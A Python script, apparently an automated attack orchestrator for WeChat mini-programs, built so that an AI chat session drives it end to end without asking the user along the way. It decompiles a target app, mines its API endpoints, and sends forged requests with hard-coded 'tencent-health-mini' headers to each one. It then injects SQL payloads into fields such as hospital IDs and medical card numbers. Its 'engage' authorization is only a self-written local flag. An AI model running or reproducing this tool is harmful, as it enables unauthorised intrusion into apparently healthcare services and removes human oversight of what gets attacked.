#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""STRIKE — 小程序安全评估编排层（会话大模型当大脑，工具链当手脚）。

设计：
  * 大脑 = 当前 AI 会话的大模型；不调用任何外部 LLM，不配置 LLM key。
  * 后端工具：wxcdp（小程序动态分析）、artex（任务/资产/发现/报告）。
  * 一次 engage 给标，auto 全自动跑完，中途不问。

路径与凭据全部通过环境变量 / strike.config.json 配置，不含任何本机绝对路径或密钥。

环境变量：
  STRIKE_WMP_ROOT     WMP-pentest-automation 根目录
  STRIKE_ARTEX_CTL    artex_ctl.py 路径（可选）
  STRIKE_ARTEX_SRC    artex 源码根（可选，仅 recon 用）
  STRIKE_MCP_TOKEN    wxcdp MCP token（默认读项目 config.py，再退到占位符）

用法：
  python strike.py engage
  python strike.py auto <appid> --domain <gateway-domain>
  python strike.py status | think | fetch | artex | recon | report
"""
from __future__ import annotations
import sys, os, json, argparse, subprocess, urllib.request, urllib.error, time, re
from pathlib import Path
from datetime import datetime

HERE = Path(__file__).resolve().parent
CFG_PATH = HERE / "strike.config.json"

def load_cfg():
    cfg = {}
    if CFG_PATH.exists():
        try: cfg = json.loads(CFG_PATH.read_text(encoding="utf-8"))
        except Exception: pass
    envmap = {
        "wmp_root": "STRIKE_WMP_ROOT",
        "artex_ctl": "STRIKE_ARTEX_CTL",
        "artex_src": "STRIKE_ARTEX_SRC",
        "mcp_token": "STRIKE_MCP_TOKEN",
    }
    for k, ev in envmap.items():
        if os.environ.get(ev): cfg[k] = os.environ[ev]
    # 默认工作区布局：本文件在 <repo>/ 下，工具链在 <repo>/WMP-pentest-automation/
    cfg.setdefault("wmp_root", str(HERE / "WMP-pentest-automation"))
    return cfg

CFG = load_cfg()
ROOT = Path(CFG["wmp_root"])
OUTROOT = ROOT / "output"
PY = ROOT / ".venv" / "Scripts" / "python.exe"
if not PY.exists(): PY = Path(sys.executable)
WXCLI = ROOT / "scripts" / "wxmcp.py"
ARTEXCTL = Path(CFG.get("artex_ctl", "")) if CFG.get("artex_ctl") else None
ENGAGE_FILE = HERE / ".strike_engaged.json"
DECISION_LOG = OUTROOT / "_strike" / "strike-decision-log.jsonl"
import ssl; CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE

def out(o): print(json.dumps(o, ensure_ascii=False, indent=2), flush=True)
def log_decision(observe, decide, nxt):
    try:
        DECISION_LOG.parent.mkdir(parents=True, exist_ok=True)
        with DECISION_LOG.open("a", encoding="utf-8") as f:
            f.write(json.dumps({"ts":datetime.now().isoformat(),"observe":observe,
                "decide":decide,"next":nxt,"brain":"session-llm(no external LLM/key)"},
                ensure_ascii=False)+"\n")
    except Exception: pass
def is_engaged():
    try: return json.loads(ENGAGE_FILE.read_text(encoding="utf-8")).get("engaged", False)
    except Exception: return False
def port_open(p):
    import socket; s=socket.socket(); s.settimeout(.4)
    try: s.connect(("127.0.0.1", p)); return True
    except Exception: return False
    finally: s.close()
def ensure_wx():
    if port_open(49999) and port_open(62000): return True
    starter = ROOT / "scripts" / "start_full_chain.py"
    if starter.exists():
        subprocess.run([str(PY), str(starter), "--no-auto-sync"], cwd=str(ROOT),
                       capture_output=True, timeout=120)
    for _ in range(12):
        if port_open(49999) and port_open(62000): return True
        time.sleep(1)
    return False

def wx_call(tool, args=None):
    if not ensure_wx(): return {"ok":False, "error":"wxcdp 未能拉起"}
    if not WXCLI.exists(): return {"ok":False, "error":f"未找到 {WXCLI}"}
    cmd=[str(PY), str(WXCLI), "call", tool, "--args", json.dumps(args or {}, ensure_ascii=False)]
    r=subprocess.run(cmd, cwd=str(ROOT), capture_output=True, text=True, timeout=180)
    try: return json.loads(r.stdout.strip())
    except Exception: return {"ok":r.returncode==0, "raw":r.stdout[:1500], "stderr":r.stderr[:300]}
def ops(action, appid=None, **kw):
    a={"action":action}
    if appid: a["appid"]=appid
    a.update(kw)
    return wx_call("decompile_ops", a)

def fetch(method, path, body=None, headers=None, base=None, timeout=20):
    url=(base or "")+path
    h={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Linux; Android 12) MicroMessenger/8.0.40"}
    if headers: h.update(headers)
    data=json.dumps(body, ensure_ascii=False).encode() if body is not None else None
    t0=time.time()
    try:
        r=urllib.request.urlopen(urllib.request.Request(url, data=data, headers=h, method=method),
                                 timeout=timeout, context=CTX)
        b=r.read().decode("utf-8","replace"); return r.status,b,round(time.time()-t0,2)
    except urllib.error.HTTPError as e:
        try: b=e.read().decode("utf-8","replace")
        except Exception: b=""
        return e.code,b,round(time.time()-t0,2)
    except Exception as e: return None,str(e)[:100],round(time.time()-t0,2)

def artex_call(method, path, data=None):
    if not ARTEXCTL or not ARTEXCTL.exists():
        return {"ok":False, "error":"未配置 artex_ctl（环境变量 STRIKE_ARTEX_CTL）"}
    cmd=[str(PY), str(ARTEXCTL), "api", method, path]
    if data is not None: cmd += ["--data", json.dumps(data, ensure_ascii=False)]
    r=subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    try: return json.loads(r.stdout.strip())
    except Exception: return {"raw":r.stdout[:500]}

def auto(appid, domain, base, gateway_path="/api/gateway"):
    """全自动：反编译 → 扫描 → 提接口 → 全端点探测 → 越权/注入 → 归档报告。"""
    if not is_engaged():
        out({"ok":False, "error":"未 engage。先运行: python strike.py engage"}); return
    import uuid
    outdir=OUTROOT/appid; outdir.mkdir(parents=True, exist_ok=True)
    report={"appid":appid,"domain":domain,"started":datetime.now().isoformat(),"phases":[]}
    def phase(name, fn):
        t0=time.time()
        try: r=fn()
        except Exception as e: r={"ok":False,"error":str(e)[:200]}
        report["phases"].append({"phase":name,"elapsed_s":round(time.time()-t0,1),"result":r})
        out({"PHASE":name,"elapsed":round(time.time()-t0,1),"summary":str(r)[:280]}); return r

    log_decision(f"目标 {appid} 全自动穿透启动", "P1 反编译拿源码", "decompile")
    phase("1-decompile", lambda: ops("decompile", appid))
    log_decision("反编译完成", "P2 全量扫描", "scan_source")
    phase("2-scan_source", lambda: ops("scan_source", appid))

    log_decision("扫描完成", "P3 从源码提取 service/func 与域名", "extract")
    def extract():
        src=None
        for cand in [outdir/"__APP__"/"appservice.js", outdir/"__PLUGINCODE__"/"appservice.js", outdir/"app-service.js"]:
            if cand.exists(): src=cand.read_text(encoding="utf-8", errors="replace"); break
        if not src:
            for f in outdir.rglob("*.js"):
                if f.stat().st_size>100000: src=f.read_text(encoding="utf-8", errors="replace"); break
        if not src: return {"ok":False,"error":"no appservice.js"}
        svcs=sorted(set(re.findall(
            r'service:\s*["\']([\w.-]+)["\'][\s\S]{0,200}?func:\s*["\']([\w.-]+)["\']', src)))
        doms=sorted(set(re.findall(r'(?:https://)?([\w.-]+\.[a-z]{2,8})', src)))
        return {"ok":True,"service_func":[[s,f] for s,f in svcs],"count":len(svcs),
                "domains":doms[:30],"source_size":len(src)}
    ex=phase("3-extract", extract)

    log_decision(f"提取到 {ex.get('count',0)} 个 service/func", "P4 逐端点探测", "probe_all")
    def probe_all():
        pairs=ex.get("service_func") or []
        GW=base or f"https://{domain}{gateway_path}"
        results=[]
        for s,f in pairs:
            rid=str(uuid.uuid4())
            hdr={"appid":appid,"authtype":"tencent-health-mini","businessid":"tencent-health-mini",
                 "request":rid,"trace":rid,"sub-businessid":"plugin_mini",
                 "User-Agent":"Mozilla/5.0 (Linux; Android 12) MicroMessenger/8.0.40"}
            body={"args":{"commonIn":{"requestId":rid,"userAppId":appid,"appId":appid,"miniId":appid,
                  "sourceType":1002,"adtag":"plugin","version":"latest","sourceVersion":"latest"},
                  "req":{}},"context":{},"service":s,"func":f}
            st,b,t=fetch("POST", f"{GW}/{s}/{f}", body, hdr, base="", timeout=15)
            results.append({"service":s,"func":f,"status":st,"ms":t,"len":len(b or ""),"sample":(b or "")[:200]})
            out({"PROBE":f"{s}.{f}","http":st,"ms":t,"len":len(b or "")})
        ok=[r for r in results if r["status"]==200]
        return {"ok":True,"total":len(results),"reachable":len(ok),"results":results}
    pr=phase("4-probe_all_endpoints", probe_all)

    log_decision(f"{pr.get('reachable',0)} 个端点可达", "P5 越权对照 + 注入", "exploit")
    def exploit():
        GW=base or f"https://{domain}{gateway_path}"
        PAY=["x' AND '1'='1","x' AND SLEEP(4)--"]
        findings=[]
        for s,f in (ex.get("service_func") or []):
            for pv in PAY:
                rid=str(uuid.uuid4())
                hdr={"appid":appid,"authtype":"tencent-health-mini","businessid":"tencent-health-mini",
                     "request":rid,"trace":rid,"sub-businessid":"plugin_mini"}
                body={"args":{"commonIn":{"requestId":rid,"userAppId":appid,"appId":appid,
                      "miniId":appid,"sourceType":1002,"adtag":"plugin"},
                      "req":{"hospitalId":pv,"cityCode":pv,"ecard_no":pv,"unionId":pv}},
                      "context":{},"service":s,"func":f}
                st,b,t=fetch("POST", f"{GW}/{s}/{f}", body, hdr, base="", timeout=12)
                flags=[]
                if t and t>=3.5: flags.append("TIME_DELAY")
                if b and re.search(r"(?i)(sql syntax|you have an error|java\.lang\.|stacktrace|exception)", b):
                    flags.append("ERROR_HINT")
                if flags: findings.append({"service":s,"func":f,"payload":pv[:20],"flags":flags,"status":st,"ms":t})
        return {"ok":True,"findings":findings,"count":len(findings)}
    exr=phase("5-exploit", exploit)

    log_decision(f"测试完成，{exr.get('count',0)} 个可疑", "P6 归档报告", "report")
    phase("6-archive", lambda: {"ok":True,"artex":artex_call("POST","/api/assets",[
        {"kind":"finding","value":json.dumps(report,ensure_ascii=False)[:4000],"source":"strike-auto"}])})
    report["finished"]=datetime.now().isoformat()
    rp=outdir/"auto-report.json"
    rp.write_text(json.dumps(report,ensure_ascii=False,indent=2),encoding="utf-8")
    out({"AUTO_DONE":str(rp),"phases":len(report["phases"]),
         "endpoints_tested":pr.get("total",0),"reachable":pr.get("reachable",0),"suspects":exr.get("count",0)})
    return report

def main():
    ap=argparse.ArgumentParser(description="STRIKE — mini-program security assessment orchestrator")
    sub=ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("engage")
    p=sub.add_parser("auto"); p.add_argument("appid"); p.add_argument("--domain", default="")
    p.add_argument("--base", default=None); p.add_argument("--gateway", default="/api/gateway")
    sub.add_parser("status")
    p=sub.add_parser("think"); p.add_argument("observe"); p.add_argument("decide"); p.add_argument("next", nargs="?", default="")
    p=sub.add_parser("fetch"); p.add_argument("method"); p.add_argument("path"); p.add_argument("body", nargs="?", default=None)
    p.add_argument("--anon", action="store_true"); p.add_argument("--base", default=None)
    p=sub.add_parser("artex"); p.add_argument("method"); p.add_argument("path"); p.add_argument("--data", default=None)
    p=sub.add_parser("recon"); p.add_argument("base_url"); p.add_argument("outdir")
    sub.add_parser("report")
    a=ap.parse_args()

    if a.cmd=="engage":
        ENGAGE_FILE.write_text(json.dumps({"engaged":True,"ts":datetime.now().isoformat(),
            "note":"一次给标，之后 auto 全自动"},ensure_ascii=False),encoding="utf-8")
        out({"ok":True,"engaged":True,"file":str(ENGAGE_FILE)})
    elif a.cmd=="auto": auto(a.appid,a.domain,a.base,a.gateway)
    elif a.cmd=="status":
        out({"wxcdp":port_open(49999),"cdp":port_open(62000),"artex":port_open(8787),"engaged":is_engaged()})
    elif a.cmd=="think": log_decision(a.observe,a.decide,a.next); out({"ok":True,"logged":True})
    elif a.cmd=="fetch":
        pth=a.path; m=re.search(r'(/api.*)$', pth)
        if m: pth=m.group(1)
        st,b,t=fetch(a.method.upper(),pth,json.loads(a.body) if a.body else None,base=a.base)
        out({"ok":st is not None,"status":st,"ms":t,"body":(b or "")[:1500]})
    elif a.cmd=="artex": out(artex_call(a.method.upper(),a.path,json.loads(a.data) if a.data else None))
    elif a.cmd=="recon":
        src=CFG.get("artex_src")
        if not src: out({"ok":False,"error":"未配置 artex_src"}); return
        recon=Path(src)/"skills"/"api-recon"/"scripts"/"harvest_static.py"
        Path(a.outdir).mkdir(parents=True,exist_ok=True)
        r=subprocess.run([str(PY),str(recon),a.base_url,a.outdir],capture_output=True,text=True,timeout=300)
        out({"ok":r.returncode==0,"stdout":r.stdout[-2000:]})
    elif a.cmd=="report":
        if not ARTEXCTL: out({"ok":False,"error":"未配置 artex_ctl"}); return
        r=subprocess.run([str(PY),str(ARTEXCTL),"report"],capture_output=True,text=True,timeout=180)
        out({"ok":r.returncode==0,"report":r.stdout[:5000]})

if __name__=="__main__": main()
